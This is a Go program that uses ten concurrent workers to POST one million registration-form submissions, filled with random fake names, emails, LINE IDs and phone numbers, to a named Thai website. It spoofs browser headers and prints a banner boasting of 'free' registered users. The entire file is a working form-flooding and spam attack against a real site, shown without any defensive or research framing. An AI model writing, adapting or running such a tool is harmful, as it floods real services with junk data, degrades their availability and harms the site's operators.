package main

import (
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

type Job struct {
	id    int
	user  string
	email string
	line  string
	tel   int
}
type Result struct {
	job       Job
	httpret   string
	workerid  int
	timeelasp string
}

var jobs = make(chan Job, 10)
var results = make(chan Result, 10)

var postUrl string = "http://www.sawasdeethailand.net/gopage14.html"

func worker(wg *sync.WaitGroup, id int) {
	for job := range jobs {
		query := fmt.Sprintf("email=%s&line_id=%s&message=.&var_fullname=%s&รู้จักสวัสดีไทยแลนด์จาก=Google&อื่นๆ_โปรดระบุ=.&เบอร์โทรติดต่อกลับ=08%d", job.email, job.line, job.user, job.tel)
		req, err := http.NewRequest("POST", postUrl, strings.NewReader(query))
		req.Header.Set("origin", "http://www.sawasdeethailand.net")
		req.Header.Set("upgrade-insecure-requests", "1")
		req.Header.Set("content-type", "application/x-www-form-urlencoded")
		req.Header.Set("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36")
		req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8")
		req.Header.Set("referer", "http://www.sawasdeethailand.net/pro=")
		req.Header.Set("accept-encoding", "gzip, deflate")
		req.Header.Set("accept-language", "en-US,en;q=0.9,th;q=0.8")
		req.Header.Set("cache-control", "no-cache")
		start := time.Now()
		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			panic(err)
		}
		/*
			if err != nil {
				defer func() {
					recover()
					fmt.Println(err)
				}()
				panic(err)

			}
		*/

		defer resp.Body.Close()
		elasp := fmt.Sprintf("%s", time.Since(start))
		output := Result{job, resp.Status, id, elasp}
		results <- output

	}
	wg.Done()
}
func createWorkerPool(noOfWorkers int) {
	var wg sync.WaitGroup
	for i := 0; i < noOfWorkers; i++ {
		wg.Add(1)
		//go worker(&wg, i)
		GoSafe(func() {
			worker(&wg, i)
		})
	}
	wg.Wait()
	close(results)
}

func GoSafe(fn func()) {
	go func() {
		defer func() {
			if err := recover(); err != nil {
				log.Println("Panic:", err)
			}
		}()
		fn()
	}()
}

func allocate(noOfJobs int) {
	for i := 0; i < noOfJobs; i++ {

		user := randomString(10)
		domain := randomString(10)
		email := fmt.Sprintf("%s@%s.com", user, domain)
		line := randomString(10)
		tel := randInt(10000000, 99999999)

		job := Job{i, user, email, line, tel}
		jobs <- job
	}
	close(jobs)
}
func result(done chan bool) {
	for result := range results {
		red := color.New(color.FgRed).SprintFunc()
		yellow := color.New(color.FgYellow).SprintFunc()
		green := color.New(color.FgGreen).SprintFunc()
		fmt.Printf("[Worker id %s] [Job id %s] [response Status: %s] [%s]\n", red(strconv.Itoa(result.workerid)), yellow(strconv.Itoa(result.job.id)), green(result.httpret), result.timeelasp)
	}
	done <- true
}
func main() {

	noOfJobs := 1000000
	noOfWorkers := 10

	red := color.New(color.FgRed).SprintFunc()
	fmt.Printf("%s\n", red("************************************************"))
	fmt.Printf("%s I will give you free %s register user %s\n", red("*"), red(strconv.Itoa(noOfJobs)), red("*"))
	fmt.Printf("%s\n", red("************************************************"))

	startTime := time.Now()
	go allocate(noOfJobs)
	done := make(chan bool)
	go result(done)
	createWorkerPool(noOfWorkers)
	<-done
	endTime := time.Now()
	diff := endTime.Sub(startTime)
	fmt.Println("total time taken ", diff.Seconds(), "seconds")
}

func randomString(l int) string {
	var char string
	buf := make([]byte, l)
	char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	for i := 0; i < l; i++ {
		buf[i] = char[rand.Intn(len(char)-1)]
	}
	return string(buf)
}

func randInt(min int, max int) int {
	return min + rand.Intn(max-min)
}
